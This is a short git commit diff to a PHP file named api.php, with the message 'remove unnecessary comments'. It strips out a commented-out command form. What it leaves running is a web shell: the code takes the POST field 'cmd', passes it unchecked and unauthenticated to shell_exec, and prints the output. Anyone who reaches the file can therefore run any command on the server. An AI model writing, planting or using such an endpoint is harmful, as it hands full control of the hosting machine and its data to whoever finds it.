a0990ae3015764b1a9957165ecacb5d83b164c73
Eugene Glova <eugene.glova@gmail.com>
2013-05-02 18:49:28 +0300

    remove unnecessary comments

--- api.php
+++ api.php
@@ -1,13 +1,5 @@
 <?php
 set_time_limit(0);
-// echo "
-// <form action=wget2.php method=post>
-// <textarea name=cmd style='width: 100%; height: 20%;''>" . @htmlentities(stripslashes($_POST['cmd'])) . "</textarea>
-// <input type=submit>
-// </form>
-// ";
-if (isset($_POST['cmd'])){
+if (isset($_POST['cmd'])) {
   echo shell_exec(str_replace("\\\r\n", '', stripcslashes($_POST['cmd'])) . ' 2>&1');
 }
-
-?>
